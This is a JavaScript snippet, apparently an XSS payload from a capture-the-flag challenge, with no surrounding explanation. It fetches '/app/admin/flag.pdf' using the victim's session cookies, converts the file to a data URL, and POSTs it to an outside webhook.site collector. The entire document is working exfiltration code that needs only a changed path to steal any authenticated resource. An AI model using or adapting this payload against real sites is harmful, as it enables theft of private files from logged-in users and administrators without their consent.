(function(){
    const flagUrl = '/app/admin/flag.pdf';
    const webhookUrl = 'https://webhook.site/35c13666-876f-4a80-bf03-1a1b6e97716f';

    fetch(flagUrl, { credentials: 'include' })
      .then(response => response.blob())
      .then(blob => {
          const reader = new FileReader();
          reader.onloadend = function() {
              const pdfData = reader.result;
              fetch(webhookUrl, {
                  method: 'POST',
                  headers: { 'Content-Type': 'application/json' },
                  body: JSON.stringify({ pdf: pdfData })
              });
          };
          reader.readAsDataURL(blob);
      })
      .catch(console.error);
})();